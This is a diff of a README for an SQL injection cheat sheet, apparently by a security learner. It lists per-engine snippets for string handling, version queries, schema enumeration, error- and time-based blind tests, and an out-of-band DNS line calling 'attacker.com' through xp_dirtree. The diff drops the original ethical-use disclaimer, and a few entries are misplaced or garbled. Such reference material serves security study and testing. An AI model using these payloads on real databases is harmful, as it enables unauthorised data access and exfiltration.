@@ -1,51 +1,84 @@
 # 🛡️ SQL Injection Cheat Sheet
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Cybersecurity-SQL%20Injection-red?style=for-the-badge">
-  <img src="https://img.shields.io/badge/Level-Beginner%20to%20Advanced-blue?style=for-the-badge">
-  <img src="https://img.shields.io/badge/Focus-Web%20Exploitation-black?style=for-the-badge">
-</p>
+![SQLi](https://img.shields.io/badge/Cybersecurity-SQL%20Injection-red?style=for-the-badge)
 
 ---
 
-## ⚡ Overview
+## 📌 Cheat Sheet
 
-This repository contains a **structured SQL Injection cheat sheet** covering essential techniques used in web security testing, penetration testing labs, and CTF challenges.
+### 🔗 String Concatenation
 
-> ⚠️ **Disclaimer:**  
-> This project is for **educational and ethical hacking purposes only**. Use it only in labs or systems you own or have permission to test.
+'foo' || 'bar' -- Oracle / PostgreSQL
+'foo' + 'bar' -- SQL Server
+CONCAT('foo','bar') -- MySQL
 
----
-
-## 🧠 What You'll Learn
-
-- String manipulation across SQL engines  
-- Database enumeration techniques  
-- Error-based data extraction  
-- Time-based blind SQL injection  
-- Conditional logic exploitation  
-- DNS exfiltration concepts  
 
 ---
 
-## 🔗 Supported Databases
+### ✂️ Substring
 
-- Oracle  
-- Microsoft SQL Server  
-- PostgreSQL  
-- MySQL  
+SUBSTR('foobar',4,2) -- Oracle
+SUBSTRING('foobar',4,2) -- SQL Server / PostgreSQL / MySQL
+
 
 ---
 
-## 📌 Cheat Sheet Sections
+### 💬 Comments
 
-### ✨ String Concatenation
-```sql
--- Oracle / PostgreSQL
-'foo' || 'bar'
+-- comment -- SQL Server / PostgreSQL / Oracle
+/* comment */ -- All
 
--- Microsoft SQL Server
-'foo' + 'bar'
+comment -- MySQL
 
--- MySQL
-CONCAT('foo','bar')
+---
+
+### 🧾 Database Version
+
+SELECT @@version -- SQL Server / MySQL
+SELECT version() -- PostgreSQL
+SELECT banner FROM v$version -- Oracle
+
+
+---
+
+### 📂 Database Enumeration
+
+SELECT * FROM information_schema.tables;
+SELECT * FROM information_schema.columns WHERE table_name='TABLE';
+
+
+---
+
+### ⚠️ Conditional Errors
+
+SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END; -- SQL Server
+SELECT pg_sleep(10) -- PostgreSQL delay test
+
+
+---
+
+### ⏱️ Time-Based Injection
+
+WAITFOR DELAY '0:0:10' -- SQL Server
+SELECT SLEEP(10) -- MySQL
+SELECT pg_sleep(10) -- PostgreSQL
+
+
+---
+
+### 🌐 DNS Lookup (advanced)
+
+exec master..xp_dirtree '//attacker.com/a' -- SQL Server
+
+
+---
+
+## 🚀 Notes
+- Used for testing SQL Injection vulnerabilities
+- Works across major database engines
+- Common in OWASP Top 10 security flaws
+
+---
+
+## 👨‍💻 Author
+DJ — Cybersecurity Learner | Homelab Builder | Future Security Engineer
